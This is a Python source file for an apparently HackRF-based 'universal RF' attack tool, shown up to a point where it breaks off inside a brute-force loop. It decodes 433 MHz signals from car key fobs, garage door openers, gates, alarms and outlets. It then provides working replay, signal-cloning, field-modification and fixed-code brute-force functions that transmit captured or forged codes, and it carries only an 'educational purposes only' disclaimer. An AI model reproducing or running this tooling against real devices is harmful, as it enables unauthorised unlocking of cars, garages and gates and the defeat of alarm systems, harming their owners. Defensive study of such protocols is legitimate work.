#!/usr/bin/env python3
"""
Universal RF Reverse Engineering Framework
Multi-Purpose Signal Analysis & Exploitation Tool

Supports:
- Car key fobs (rolling & fixed codes)
- Garage door openers
- Wireless alarms
- Remote controls (TV, AC, fans)
- Pagers and one-way communication
- Smart home devices (433MHz)
- Wireless doorbells
- Power outlet switches
- Gate controllers

"Kepada Tuhan Kita Berserah" - EDUCATIONAL/RESEARCH PURPOSES ONLY
"""

import os
import sys
import time
import json
import argparse
import numpy as np
from dataclasses import dataclass, asdict
from typing import List, Dict, Optional, Tuple, Any
from enum import Enum
import subprocess
from collections import Counter
import hashlib


class DeviceType(Enum):
    """Wireless devices Types"""
    CAR_KEY_ROLLING = "car_key_rolling"
    CAR_KEY_FIXED = "car_key_fixed"
    GARAGE_DOOR = "garage_door"
    GATE_CONTROLLER = "gate_controller"
    ALARM_SYSTEM = "alarm_system"
    REMOTE_CONTROL = "remote_control"
    POWER_OUTLET = "power_outlet"
    DOORBELL = "doorbell"
    PAGER = "pager"
    SMART_HOME = "smart_home"
    UNKNOWN = "unknown"


class SignalType(Enum):
    """The Signal classification"""
    FIXED_CODE = "fixed"           # Simple replay attack works
    ROLLING_CODE = "rolling"       # Needs RollBack attack
    ENCRYPTED = "encrypted"        # Advanced crypto
    TIMESTAMP = "timestamp"        # Time-based codes
    LEARNING_CODE = "learning"     # Can be learned/cloned


@dataclass
class DecodedSignal:
    """Signal information Decoded"""
    raw_bits: str                    # Binary string
    hex_data: str                    # Hex representation
    modulation: str                  # ASK/FSK/PSK
    encoding: str                    # Manchester/PWM/NRZ
    baud_rate: int                   # Symbols per second
    frequency: int                   # Center frequency
    snr_db: float                    # Signal quality
    
    # Identified components
    preamble: Optional[str] = None   # Sync/preamble bits
    address: Optional[str] = None    # Device address/ID
    command: Optional[str] = None    # Command/function code
    counter: Optional[str] = None    # Rolling counter
    checksum: Optional[str] = None   # Error detection
    
    # Classification
    device_type: DeviceType = DeviceType.UNKNOWN
    signal_type: SignalType = SignalType.FIXED_CODE
    
    # Security assessment
    is_vulnerable: bool = True
    vulnerability_type: List[str] = None
    
    # Metadata
    timestamp: float = 0.0
    notes: str = ""


class ProtocolDatabase:
    """
    Database of known protocols and their patterns
    Reference: Common wireless protocols found in the wild
    """
    
    KNOWN_PROTOCOLS = {
        # Garage door protocols
        "dip_switch_12bit": {
            "device_type": DeviceType.GARAGE_DOOR,
            "signal_type": SignalType.FIXED_CODE,
            "pattern": {
                "total_bits": 12,
                "encoding": "PWM",
                "structure": "CCCCCCCCCCCC"  # C = Code bit
            },
            "notes": "Common 12-bit DIP switch garage openers"
        },
        
        "chamberlain_rolling": {
            "device_type": DeviceType.GARAGE_DOOR,
            "signal_type": SignalType.ROLLING_CODE,
            "pattern": {
                "total_bits": 66,
                "preamble": "10" * 6,  # 12 bits alternating
                "structure": "PPPPPPPPPPPPSSSSSSSSSSSSSSSSCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC"
            },
            "notes": "Chamberlain/LiftMaster Security+ (rolling code)"
        },
        
        # Keeloq-based devices
        "keeloq_standard": {
            "device_type": DeviceType.CAR_KEY_ROLLING,
            "signal_type": SignalType.ROLLING_CODE,
            "pattern": {
                "total_bits": 66,
                "preamble_bits": 12,
                "function_bits": 4,
                "encrypted_bits": 32,
                "serial_bits": 28,
                "structure": "PPPPPPPPPPPPFFFFEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEESSSSSSSSSSSSSSSSSSSSSSSSSSSS"
            },
            "notes": "KeeLoq cipher - used in many car keys and garage doors"
        },
        
        # Simple remote controls
        "ev1527_learning": {
            "device_type": DeviceType.REMOTE_CONTROL,
            "signal_type": SignalType.LEARNING_CODE,
            "pattern": {
                "total_bits": 24,
                "address_bits": 20,
                "data_bits": 4,
                "structure": "AAAAAAAAAAAAAAAAAAADDDD"
            },
            "notes": "EV1527 chip - common in cheap remotes, can be learned"
        },
        
        "pt2262": {
            "device_type": DeviceType.REMOTE_CONTROL,
            "signal_type": SignalType.FIXED_CODE,
            "pattern": {
                "total_bits": 24,
                "structure": "AAAAAAAAAAAAAAAAAAAADDDD"
            },
            "notes": "PT2262 chip - tri-state encoding, very common"
        },
        
        # Power outlet switches
        "outlet_1527": {
            "device_type": DeviceType.POWER_OUTLET,
            "signal_type": SignalType.LEARNING_CODE,
            "pattern": {
                "total_bits": 24,
                "house_code_bits": 20,
                "unit_bits": 4,
                "structure": "HHHHHHHHHHHHHHHHHHHUUUU"
            },
            "notes": "Wireless power outlet with learning mode"
        },
        
        # Wireless doorbells
        "doorbell_simple": {
            "device_type": DeviceType.DOORBELL,
            "signal_type": SignalType.FIXED_CODE,
            "pattern": {
                "total_bits": 24,
                "structure": "CCCCCCCCCCCCCCCCCCCCCCCC"
            },
            "notes": "Simple wireless doorbell"
        },
        
        # Pagers
        "pocsag_pager": {
            "device_type": DeviceType.PAGER,
            "signal_type": SignalType.FIXED_CODE,
            "pattern": {
                "preamble": "10101010" * 18,  # 144 bits
                "total_bits": 544,  # Batch + messages
                "structure": "complex"
            },
            "notes": "POCSAG pager protocol - numeric/alphanumeric"
        },
        
        # Alarm systems
        "alarm_contact": {
            "device_type": DeviceType.ALARM_SYSTEM,
            "signal_type": SignalType.ROLLING_CODE,
            "pattern": {
                "total_bits": 48,
                "structure": "SSSSSSSSSSSSSSSSCCCCCCCCCCCCCCCCDDDDDDDDDDDDDDDD"
            },
            "notes": "Wireless alarm sensor (door/window contact)"
        },
    }
    
    @staticmethod
    def identify_protocol(bits: str, baud_rate: int = 0) -> Optional[Dict]:
        """
        Try to identify protocol based on bit patterns
        """
        bit_length = len(bits)
        
        # Check against known patterns
        candidates = []
        
        for proto_name, proto_info in ProtocolDatabase.KNOWN_PROTOCOLS.items():
            pattern = proto_info.get("pattern", {})
            expected_bits = pattern.get("total_bits", 0)
            
            # Check length match
            if expected_bits > 0 and abs(bit_length - expected_bits) <= 2:
                candidates.append({
                    "name": proto_name,
                    "info": proto_info,
                    "confidence": 0.8
                })
            
            # Check preamble match
            if "preamble" in pattern:
                preamble = pattern["preamble"]
                if bits.startswith(preamble):
                    candidates.append({
                        "name": proto_name,
                        "info": proto_info,
                        "confidence": 0.9
                    })
        
        if candidates:
            # Return highest confidence
            return max(candidates, key=lambda x: x["confidence"])
        
        return None


class UniversalSignalAnalyzer:
    """
    Universal signal analyzer for any OOK/ASK/FSK device
    Automatically detects and decodes protocols
    """
    
    def __init__(self):
        self.protocol_db = ProtocolDatabase()
    
    def analyze_iq_file(self, filename: str, sample_rate: int = 8_000_000) -> DecodedSignal:
        """
        Comprehensive analysis of captured IQ file
        Returns decoded signal with all extracted information
        """
        print(f"\n{'='*70}")
        print(f"UNIVERSAL SIGNAL ANALYSIS")
        print(f"{'='*70}")
        print(f"File: {filename}")
        print(f"Sample Rate: {sample_rate / 1e6:.1f} MHz\n")
        
        # Load IQ samples
        samples = np.fromfile(filename, dtype=np.int8)
        iq_samples = samples[::2] + 1j * samples[1::2]
        
        # Step 1: Detect modulation
        modulation = self._detect_modulation(iq_samples)
        print(f"[1/7] Modulation: {modulation}")
        
        # Step 2: Detect baud rate
        baud_rate = self._detect_baud_rate(iq_samples, sample_rate)
        print(f"[2/7] Baud Rate: ~{baud_rate} bps")
        
        # Step 3: Calculate SNR
        snr_db = self._calculate_snr(iq_samples)
        print(f"[3/7] SNR: {snr_db:.1f} dB {'✓' if snr_db > 15 else '⚠'}")
        
        # Step 4: Demodulate to bits
        if "ASK" in modulation or "OOK" in modulation:
            bits = self._demodulate_ask(iq_samples, sample_rate, baud_rate)
        elif "FSK" in modulation:
            bits = self._demodulate_fsk(iq_samples, sample_rate, baud_rate)
        else:
            bits = np.array([])
        
        print(f"[4/7] Demodulated: {len(bits)} raw bits")
        
        # Step 5: Detect encoding
        encoding = self._detect_encoding(bits)
        print(f"[5/7] Encoding: {encoding}")
        
        # Step 6: Decode based on encoding
        if encoding == "Manchester":
            decoded_bits = self._decode_manchester(bits)
        elif encoding == "PWM":
            decoded_bits = self._decode_pwm(bits)
        else:
            decoded_bits = bits
        
        print(f"[6/7] Decoded: {len(decoded_bits)} data bits")
        
        # Convert to binary string
        bit_string = ''.join(map(str, decoded_bits.astype(int)))
        
        # Convert to hex
        hex_data = self._bits_to_hex(decoded_bits)
        
        print(f"[7/7] Binary: {bit_string[:64]}{'...' if len(bit_string) > 64 else ''}")
        print(f"      Hex: {hex_data}\n")
        
        # Step 7: Protocol identification
        protocol_match = self.protocol_db.identify_protocol(bit_string, baud_rate)
        
        if protocol_match:
            print(f"{'='*70}")
            print(f"PROTOCOL IDENTIFIED: {protocol_match['name']}")
            print(f"Confidence: {protocol_match['confidence']*100:.0f}%")
            print(f"Device Type: {protocol_match['info']['device_type'].value}")
            print(f"Signal Type: {protocol_match['info']['signal_type'].value}")
            print(f"Notes: {protocol_match['info']['notes']}")
            print(f"{'='*70}\n")
        
        # Step 8: Extract components
        components = self._extract_components(bit_string, protocol_match)
        
        # Create decoded signal object
        decoded = DecodedSignal(
            raw_bits=bit_string,
            hex_data=hex_data,
            modulation=modulation,
            encoding=encoding,
            baud_rate=baud_rate,
            frequency=0,  # Set by caller
            snr_db=snr_db,
            preamble=components.get("preamble"),
            address=components.get("address"),
            command=components.get("command"),
            counter=components.get("counter"),
            checksum=components.get("checksum"),
            device_type=protocol_match['info']['device_type'] if protocol_match else DeviceType.UNKNOWN,
            signal_type=protocol_match['info']['signal_type'] if protocol_match else SignalType.FIXED_CODE,
            timestamp=time.time()
        )
        
        # Security assessment
        decoded = self._assess_security(decoded)
        
        return decoded
    
    def _detect_modulation(self, iq_samples: np.ndarray) -> str:
        """Detect modulation type"""
        magnitude = np.abs(iq_samples)
        phase = np.angle(iq_samples)
        
        mag_var = np.var(magnitude / np.max(magnitude) if np.max(magnitude) > 0 else magnitude)
        phase_diff_std = np.std(np.diff(phase))
        inst_freq_std = np.std(np.diff(np.unwrap(phase)))
        
        if mag_var > 0.05 and phase_diff_std < 0.5:
            return "ASK/OOK"
        elif inst_freq_std > 0.01 and mag_var < 0.3:
            return "FSK"
        elif phase_diff_std > 0.5:
            return "PSK"
        else:
            return "Unknown"
    
    def _detect_baud_rate(self, iq_samples: np.ndarray, sample_rate: int) -> int:
        """Detect baud rate via autocorrelation"""
        envelope = np.abs(iq_samples)
        envelope = envelope - np.mean(envelope)
        
        autocorr = np.correlate(envelope, envelope, mode='full')
        autocorr = autocorr[len(autocorr)//2:]
        
        threshold = np.max(autocorr) * 0.3
        
        for i in range(10, min(10000, len(autocorr))):
            if autocorr[i] > threshold:
                if i > 0 and autocorr[i] > autocorr[i-1] and autocorr[i] > autocorr[i+1]:
                    symbol_period = i
                    return int(sample_rate / symbol_period)
        
        return 1000  # Default fallback
    
    def _calculate_snr(self, iq_samples: np.ndarray) -> float:
        """Calculate SNR in dB"""
        power = np.abs(iq_samples) ** 2
        signal_power = np.max(power)
        
        sorted_power = np.sort(power)
        noise_power = np.mean(sorted_power[:len(sorted_power)//10])
        
        if noise_power > 0:
            snr_linear = signal_power / noise_power
            return 10 * np.log10(snr_linear)
        return 0.0
    
    def _demodulate_ask(self, iq_samples: np.ndarray, sample_rate: int, baud_rate: int) -> np.ndarray:
        """ASK/OOK demodulation"""
        envelope = np.abs(iq_samples)
        
        # Low-pass filter
        from scipy import signal
        cutoff = baud_rate * 2
        sos = signal.butter(4, cutoff, fs=sample_rate, output='sos')
        filtered = signal.sosfilt(sos, envelope)
        
        # Sample at symbol rate
        samples_per_symbol = int(sample_rate / baud_rate)
        sampled_bits = []
        
        for i in range(0, len(filtered) - samples_per_symbol, samples_per_symbol):
            sample_idx = i + samples_per_symbol // 2
            if sample_idx < len(filtered):
                sampled_bits.append(filtered[sample_idx])
        
        # Threshold
        if sampled_bits:
            threshold = np.mean(sampled_bits)
            return (np.array(sampled_bits) > threshold).astype(int)
        
        return np.array([])
    
    def _demodulate_fsk(self, iq_samples: np.ndarray, sample_rate: int, baud_rate: int) -> np.ndarray:
        """FSK demodulation"""
        phase = np.angle(iq_samples)
        inst_freq = np.diff(np.unwrap(phase))
        
        from scipy import signal
        cutoff = baud_rate * 2
        sos = signal.butter(4, cutoff, fs=sample_rate, output='sos')
        filtered = signal.sosfilt(sos, inst_freq)
        
        samples_per_symbol = int(sample_rate / baud_rate)
        sampled_bits = []
        
        for i in range(0, len(filtered) - samples_per_symbol, samples_per_symbol):
            sample_idx = i + samples_per_symbol // 2
            if sample_idx < len(filtered):
                sampled_bits.append(filtered[sample_idx])
        
        if sampled_bits:
            threshold = np.median(sampled_bits)
            return (np.array(sampled_bits) > threshold).astype(int)
        
        return np.array([])
    
    def _detect_encoding(self, bits: np.ndarray) -> str:
        """Detect encoding scheme"""
        if len(bits) < 100:
            return "Unknown"
        
        transitions = np.sum(np.abs(np.diff(bits.astype(int))))
        transition_rate = transitions / len(bits)
        
        if 0.8 < transition_rate < 1.2:
            return "Manchester"
        
        # Check PWM
        runs = []
        current_run = 1
        for i in range(1, len(bits)):
            if bits[i] == bits[i-1]:
                current_run += 1
            else:
                runs.append(current_run)
                current_run = 1
        
        if runs and np.var(runs) > 5:
            return "PWM"
        
        return "NRZ"
    
    def _decode_manchester(self, bits: np.ndarray) -> np.ndarray:
        """Decode Manchester encoding"""
        decoded = []
        i = 0
        while i < len(bits) - 1:
            if bits[i] == 1 and bits[i+1] == 0:
                decoded.append(0)
            elif bits[i] == 0 and bits[i+1] == 1:
                decoded.append(1)
            i += 2
        return np.array(decoded)
    
    def _decode_pwm(self, bits: np.ndarray) -> np.ndarray:
        """Decode PWM encoding"""
        transitions = np.where(np.abs(np.diff(bits.astype(int))) != 0)[0]
        
        if len(transitions) < 2:
            return bits
        
        pulse_widths = np.diff(transitions)
        median_width = np.median(pulse_widths)
        
        decoded = []
        for width in pulse_widths:
            if width < median_width * 1.5:
                decoded.append(0)
            else:
                decoded.append(1)
        
        return np.array(decoded)
    
    def _bits_to_hex(self, bits: np.ndarray) -> str:
        """Convert bits to hex string"""
        if len(bits) == 0:
            return ""
        
        bit_string = ''.join(map(str, bits.astype(int)))
        
        # Pad to byte boundary
        padding = (8 - len(bit_string) % 8) % 8
        bit_string = bit_string + '0' * padding
        
        hex_values = []
        for i in range(0, len(bit_string), 8):
            byte_bits = bit_string[i:i+8]
            if len(byte_bits) == 8:
                byte_val = int(byte_bits, 2)
                hex_values.append(f"{byte_val:02X}")
        
        return ' '.join(hex_values)
    
    def _extract_components(self, bits: str, protocol_match: Optional[Dict]) -> Dict[str, str]:
        """Extract signal components based on protocol"""
        components = {}
        
        if not protocol_match:
            # Generic extraction for unknown protocols
            # Look for repeating patterns (preamble)
            if len(bits) >= 16:
                # Check first 16 bits for common preambles
                preamble_candidates = [
                    "1010101010101010",  # Alternating
                    "1111111100000000",  # Square wave
                    "1100110011001100",  # Other patterns
                ]
                
                for preamble in preamble_candidates:
                    if bits.startswith(preamble[:min(len(preamble), len(bits))]):
                        components["preamble"] = bits[:16]
                        break
            
            return components
        
        # Extract based on known protocol structure
        pattern = protocol_match['info'].get('pattern', {})
        structure = pattern.get('structure', '')
        
        if not structure:
            return components
        
        # Parse structure string
        idx = 0
        component_type = None
        component_start = 0
        
        for i, char in enumerate(structure):
            if char != component_type:
                # Save previous component
                if component_type:
                    comp_name = {
                        'P': 'preamble',
                        'S': 'address',  # Serial/Address
                        'C': 'command',  # Command/Code
                        'E': 'counter',  # Encrypted/Counter
                        'F': 'function',
                        'A': 'address',
                        'D': 'command',  # Data
                        'H': 'address',  # House code
                        'U': 'command',  # Unit code
                    }.get(component_type, 'unknown')
                    
                    if component_start < len(bits):
                        components[comp_name] = bits[component_start:min(i, len(bits))]
                
                component_type = char
                component_start = i
        
        # Save last component
        if component_type and component_start < len(bits):
            comp_name = {
                'P': 'preamble',
                'S': 'address',
                'C': 'command',
                'E': 'counter',
                'F': 'function',
                'A': 'address',
                'D': 'command',
                'H': 'address',
                'U': 'command',
            }.get(component_type, 'unknown')
            components[comp_name] = bits[component_start:]
        
        return components
    
    def _assess_security(self, decoded: DecodedSignal) -> DecodedSignal:
        """Assess security vulnerabilities"""
        vulnerabilities = []
        
        # Check signal type
        if decoded.signal_type == SignalType.FIXED_CODE:
            vulnerabilities.append("Simple Replay Attack")
            vulnerabilities.append("Brute Force Possible")
            decoded.is_vulnerable = True
        
        elif decoded.signal_type == SignalType.LEARNING_CODE:
            vulnerabilities.append("Learning Mode Exploitation")
            vulnerabilities.append("Simple Replay Attack")
            decoded.is_vulnerable = True
        
        elif decoded.signal_type == SignalType.ROLLING_CODE:
            # Check code length
            if decoded.counter and len(decoded.counter) <= 16:
                vulnerabilities.append("RollBack Attack (Small Counter)")
                decoded.is_vulnerable = True
            else:
                vulnerabilities.append("Possible RollBack Attack")
                decoded.is_vulnerable = False
        
        # Check for weak encryption
        if decoded.device_type == DeviceType.CAR_KEY_ROLLING:
            if "keeloq" in decoded.notes.lower():
                vulnerabilities.append("KeeLoq Cipher (Known Weaknesses)")
        
        # Check SNR
        if decoded.snr_db < 10:
            vulnerabilities.append("Low SNR - May Need Signal Amplification")
        
        decoded.vulnerability_type = vulnerabilities
        
        return decoded


class SignalExplainer:
    """
    Interactive signal explanation system
    Explains each bit field to the user
    """
    
    @staticmethod
    def explain_signal(decoded: DecodedSignal, interactive: bool = True):
        """
        Explain the decoded signal in human-readable form
        """
        print(f"\n{'='*70}")
        print(f"SIGNAL EXPLANATION")
        print(f"{'='*70}\n")
        
        print(f"📡 Device Type: {decoded.device_type.value.upper().replace('_', ' ')}")
        print(f"🔐 Signal Type: {decoded.signal_type.value.upper()}")
        print(f"📊 Total Bits: {len(decoded.raw_bits)}")
        print(f"🎯 Modulation: {decoded.modulation}")
        print(f"⚡ Encoding: {decoded.encoding}")
        print(f"📈 SNR: {decoded.snr_db:.1f} dB\n")
        
        print(f"{'─'*70}")
        print(f"BIT-BY-BIT BREAKDOWN:")
        print(f"{'─'*70}\n")
        
        # Explain each component
        if decoded.preamble:
            print(f"🔹 PREAMBLE ({len(decoded.preamble)} bits)")
            print(f"   Binary: {decoded.preamble}")
            print(f"   Hex: {SignalExplainer._bits_to_hex_simple(decoded.preamble)}")
            print(f"   Purpose: Synchronization pattern for receiver")
            print(f"   Note: Usually alternating 1/0 pattern\n")
            
            if interactive:
                input("   Press Enter for next field...")
        
        if decoded.address:
            print(f"🔹 ADDRESS/ID ({len(decoded.address)} bits)")
            print(f"   Binary: {decoded.address}")
            print(f"   Hex: {SignalExplainer._bits_to_hex_simple(decoded.address)}")
            print(f"   Decimal: {int(decoded.address, 2) if decoded.address else 'N/A'}")
            print(f"   Purpose: Unique device identifier")
            print(f"   Note: This identifies which device/transmitter\n")
            
            if interactive:
                input("   Press Enter for next field...")
        
        if decoded.command:
            print(f"🔹 COMMAND/DATA ({len(decoded.command)} bits)")
            print(f"   Binary: {decoded.command}")
            print(f"   Hex: {SignalExplainer._bits_to_hex_simple(decoded.command)}")
            print(f"   Decimal: {int(decoded.command, 2) if decoded.command else 'N/A'}")
            print(f"   Purpose: Button pressed or command code")
            print(f"   Possible meanings:")
            SignalExplainer._explain_command(decoded.command, decoded.device_type)
            print()
            
            if interactive:
                input("   Press Enter for next field...")
        
        if decoded.counter:
            print(f"🔹 COUNTER/ENCRYPTED ({len(decoded.counter)} bits)")
            print(f"   Binary: {decoded.counter}")
            print(f"   Hex: {SignalExplainer._bits_to_hex_simple(decoded.counter)}")
            if decoded.signal_type == SignalType.ROLLING_CODE:
                print(f"   Purpose: Rolling counter (prevents replay)")
                print(f"   Note: This value increments with each use")
                print(f"   Security: Encrypted, but vulnerable to RollBack\n")
            else:
                print(f"   Purpose: Additional data or checksum\n")
            
            if interactive:
                input("   Press Enter to continue...")
        
        # Security assessment
        print(f"\n{'─'*70}")
        print(f"SECURITY ASSESSMENT:")
        print(f"{'─'*70}\n")
        
        if decoded.is_vulnerable:
            print(f"🔓 VULNERABLE: {decoded.vulnerability_type[0]}")
            print(f"\nIdentified Vulnerabilities:")
            for i, vuln in enumerate(decoded.vulnerability_type, 1):
                print(f"   {i}. {vuln}")
        else:
            print(f"🔒 RELATIVELY SECURE")
            print(f"\nPossible Attack Vectors:")
            for i, vuln in enumerate(decoded.vulnerability_type, 1):
                print(f"   {i}. {vuln}")
        
        print(f"\n{'='*70}\n")
    
    @staticmethod
    def _bits_to_hex_simple(bits: str) -> str:
        """Simple bit to hex conversion"""
        if not bits:
            return "N/A"
        
        # Pad to 4-bit boundary
        padding = (4 - len(bits) % 4) % 4
        bits = bits + '0' * padding
        
        hex_vals = []
        for i in range(0, len(bits), 4):
            nibble = bits[i:i+4]
            hex_vals.append(f"{int(nibble, 2):X}")
        
        return ''.join(hex_vals)
    
    @staticmethod
    def _explain_command(command_bits: str, device_type: DeviceType):
        """Explain possible command meanings"""
        if not command_bits:
            return
        
        cmd_int = int(command_bits, 2)
        
        if device_type == DeviceType.CAR_KEY_ROLLING or device_type == DeviceType.CAR_KEY_FIXED:
            meanings = {
                0: "Lock",
                1: "Unlock",
                2: "Trunk/Boot",
                3: "Panic/Alarm"
            }
            print(f"      {cmd_int} = {meanings.get(cmd_int, 'Unknown button')}")
        
        elif device_type == DeviceType.GARAGE_DOOR:
            print(f"      {cmd_int} = Open/Close command")
        
        elif device_type == DeviceType.POWER_OUTLET:
            on_off = "ON" if cmd_int % 2 == 1 else "OFF"
            unit = cmd_int // 2
            print(f"      Unit {unit}: {on_off}")
        
        elif device_type == DeviceType.REMOTE_CONTROL:
            buttons = ["Button A", "Button B", "Button C", "Button D"]
            if cmd_int < len(buttons):
                print(f"      {buttons[cmd_int]}")
            else:
                print(f"      Button {cmd_int}")
        
        else:
            print(f"      Value: {cmd_int}")


class UniversalRFTool:
    """
    Universal RF manipulation tool
    Supports: replay, clone, modify, brute-force
    """
    
    def __init__(self, frequency: int = 433_920_000, sample_rate: int = 8_000_000):
        self.frequency = frequency
        self.sample_rate = sample_rate
        self.analyzer = UniversalSignalAnalyzer()
    
    def capture_and_decode(self, duration: float = 2.0, 
                          output_file: str = "capture.iq") -> DecodedSignal:
        """
        Capture and automatically decode signal
        """
        print(f"\n{'='*70}")
        print(f"UNIVERSAL RF CAPTURE")
        print(f"{'='*70}")
        print(f"Frequency: {self.frequency / 1e6:.3f} MHz")
        print(f"Duration: {duration}s\n")
        
        # Countdown
        for i in range(3, 0, -1):
            print(f"Activating device in {i}...")
            time.sleep(1)
        
        print(">>> ACTIVATE DEVICE NOW! <<<\n")
        
        # Capture
        cmd = [
            'hackrf_transfer',
            '-r', output_file,
            '-f', str(self.frequency),
            '-s', str(self.sample_rate),
            '-a', '1',
            '-l', '40',
            '-g', '62',
            '-n', str(int(self.sample_rate * duration * 2))
        ]
        
        try:
            subprocess.run(cmd, check=True, capture_output=True, timeout=duration+5)
        except Exception as e:
            print(f"[!] Capture error: {e}")
            return None
        
        if not os.path.exists(output_file):
            print("[!] Capture file not created")
            return None
        
        print(f"[✓] Captured to {output_file}\n")
        
        # Analyze
        decoded = self.analyzer.analyze_iq_file(output_file, self.sample_rate)
        decoded.frequency = self.frequency
        
        return decoded
    
    def replay_signal(self, iq_file: str, repeat: int = 1, delay_ms: int = 100) -> bool:
        """
        Replay captured signal
        """
        print(f"\n{'='*70}")
        print(f"REPLAY ATTACK")
        print(f"{'='*70}")
        print(f"File: {iq_file}")
        print(f"Repeat: {repeat}x")
        print(f"Delay: {delay_ms}ms\n")
        
        response = input("Execute replay? (yes/no): ")
        if response.lower() != 'yes':
            return False
        
        print("\nTransmitting in 3 seconds...")
        time.sleep(3)
        
        for i in range(repeat):
            if repeat > 1:
                print(f"[{i+1}/{repeat}] Transmitting...")
            
            cmd = [
                'hackrf_transfer',
                '-t', iq_file,
                '-f', str(self.frequency),
                '-s', str(self.sample_rate),
                '-a', '1',
                '-x', '47'
            ]
            
            try:
                subprocess.run(cmd, check=True, capture_output=True, timeout=10)
            except Exception as e:
                print(f"[!] TX error: {e}")
                return False
            
            if i < repeat - 1:
                time.sleep(delay_ms / 1000.0)
        
        print(f"\n[✓] Replay complete!\n")
        return True
    
    def clone_signal(self, decoded: DecodedSignal, output_file: str = "cloned.iq") -> str:
        """
        Clone signal - recreate from decoded bits
        Useful for transmitting without original capture
        """
        print(f"\n{'='*70}")
        print(f"SIGNAL CLONING")
        print(f"{'='*70}\n")
        
        # Re-encode bits to IQ
        iq_samples = self._encode_bits_to_iq(
            decoded.raw_bits,
            decoded.baud_rate,
            decoded.encoding,
            decoded.modulation
        )
        
        # Save to file
        iq_int8 = np.zeros(len(iq_samples) * 2, dtype=np.int8)
        iq_int8[::2] = (np.real(iq_samples) * 127).astype(np.int8)
        iq_int8[1::2] = (np.imag(iq_samples) * 127).astype(np.int8)
        iq_int8.tofile(output_file)
        
        print(f"[✓] Cloned signal saved to: {output_file}\n")
        
        return output_file
    
    def modify_and_send(self, decoded: DecodedSignal):
        """
        Interactive signal modification
        """
        print(f"\n{'='*70}")
        print(f"SIGNAL MODIFICATION")
        print(f"{'='*70}\n")
        
        print("Original Signal:")
        print(f"  Address: {decoded.address}")
        print(f"  Command: {decoded.command}")
        print(f"  Counter: {decoded.counter}\n")
        
        print("Modification Options:")
        print("  1. Change command code")
        print("  2. Increment counter")
        print("  3. Change address")
        print("  4. Bit flip attack")
        print("  5. Cancel\n")
        
        choice = input("Select option (1-5): ")
        
        modified_bits = decoded.raw_bits
        
        if choice == '1':
            # Change command
            if decoded.command:
                print(f"\nCurrent command: {decoded.command} (decimal: {int(decoded.command, 2)})")
                new_cmd = input("New command value (decimal): ")
                try:
                    new_cmd_int = int(new_cmd)
                    new_cmd_bits = format(new_cmd_int, f'0{len(decoded.command)}b')
                    
                    # Replace command in full bit string
                    # Find position of command
                    cmd_start = modified_bits.find(decoded.command)
                    if cmd_start >= 0:
                        modified_bits = (modified_bits[:cmd_start] + 
                                       new_cmd_bits + 
                                       modified_bits[cmd_start+len(decoded.command):])
                        print(f"[✓] Command changed to {new_cmd_bits}")
                except:
                    print("[!] Invalid input")
                    return
        
        elif choice == '2':
            # Increment counter
            if decoded.counter:
                counter_val = int(decoded.counter, 2)
                counter_val += 1
                new_counter = format(counter_val, f'0{len(decoded.counter)}b')
                
                cnt_start = modified_bits.find(decoded.counter)
                if cnt_start >= 0:
                    modified_bits = (modified_bits[:cnt_start] + 
                                   new_counter + 
                                   modified_bits[cnt_start+len(decoded.counter):])
                    print(f"[✓] Counter incremented: {counter_val}")
        
        elif choice == '3':
            # Change address
            if decoded.address:
                print(f"\nCurrent address: {decoded.address} (decimal: {int(decoded.address, 2)})")
                new_addr = input("New address value (decimal): ")
                try:
                    new_addr_int = int(new_addr)
                    new_addr_bits = format(new_addr_int, f'0{len(decoded.address)}b')
                    
                    addr_start = modified_bits.find(decoded.address)
                    if addr_start >= 0:
                        modified_bits = (modified_bits[:addr_start] + 
                                       new_addr_bits + 
                                       modified_bits[addr_start+len(decoded.address):])
                        print(f"[✓] Address changed to {new_addr_bits}")
                except:
                    print("[!] Invalid input")
                    return
        
        elif choice == '4':
            # Bit flip
            bit_pos = input("Bit position to flip (0-based): ")
            try:
                pos = int(bit_pos)
                if 0 <= pos < len(modified_bits):
                    bit_list = list(modified_bits)
                    bit_list[pos] = '1' if bit_list[pos] == '0' else '0'
                    modified_bits = ''.join(bit_list)
                    print(f"[✓] Flipped bit at position {pos}")
            except:
                print("[!] Invalid position")
                return
        
        else:
            print("Cancelled")
            return
        
        # Create modified signal
        modified_decoded = DecodedSignal(
            raw_bits=modified_bits,
            hex_data='',
            modulation=decoded.modulation,
            encoding=decoded.encoding,
            baud_rate=decoded.baud_rate,
            frequency=decoded.frequency,
            snr_db=decoded.snr_db,
            device_type=decoded.device_type,
            signal_type=decoded.signal_type
        )
        
        # Clone and transmit
        print("\nCreating modified signal...")
        cloned_file = self.clone_signal(modified_decoded, "modified.iq")
        
        response = input("\nTransmit modified signal? (yes/no): ")
        if response.lower() == 'yes':
            self.replay_signal(cloned_file, repeat=1)
    
    def brute_force_attack(self, decoded: DecodedSignal):
        """
        Brute force attack for fixed codes
        """
        if decoded.signal_type != SignalType.FIXED_CODE:
            print("[!] Brute force only works on fixed codes")
            return
        
        print(f"\n{'='*70}")
        print(f"BRUTE FORCE ATTACK")
        print(f"{'='*70}\n")
        
        if decoded.command:
            code_length = len(decoded.command)
            total_codes = 2 ** code_length
            
            print(f"Command field: {code_length} bits")
            print(f"Total combinations: {total_codes:,}")
            print(f"Estimated time: {(total_codes * 0.1 / 60):.1f} minutes\n")
            
            response = input("Start brute force? (yes/no): ")
            if response.lower() != 'yes':
                return
            
            # Keep address, vary command
            for i in range(total_codes):
                if i % 100 == 0:
                    print(f"[{i}/{total_codes}] Testing code {i:0{code_length}b}")
                
                # Create new command
                new_cmd = format(i, f'0{code_length}b')
                
                # Replace in full bits
                modified_bits = decoded.raw_bits
                if decoded.command:
                    cmd_start = modified_bits.find(decoded.command)
                    if cmd_start >= 0:
                        modified_bits = (modified_bits[:cmd_start] + 
                                       new_cmd + 
                                       modified_bits[cmd_start+len(decoded.command):])
                
                # Create and transmit
                modified = DecodedSignal(
                    raw_bits=modified_bits,
                    hex_data='',
                    modulation=decoded.modulation,
                    encoding=decoded.encoding,
                    baud_rate=decoded.baud_rate,
                    frequency=decoded.frequency,
                    snr_db=decoded.snr_db
                )
                
                temp_file = "brute_temp.iq"
                self.clone_signal(modified, temp_file)
                
                # Quick transmit
                cmd = [
                    'hackrf_transfer', '-t', temp_file,
                    '-f', str(self.frequency), '-s', str(self.sample_rate),
                    '-a', '1', '-x', '47'
                ]
                
                try:
                    subprocess.run(cmd, check=True, capture_output=True, timeout=5)
                except:
                    pass
                
                time.sleep(0.1)
            
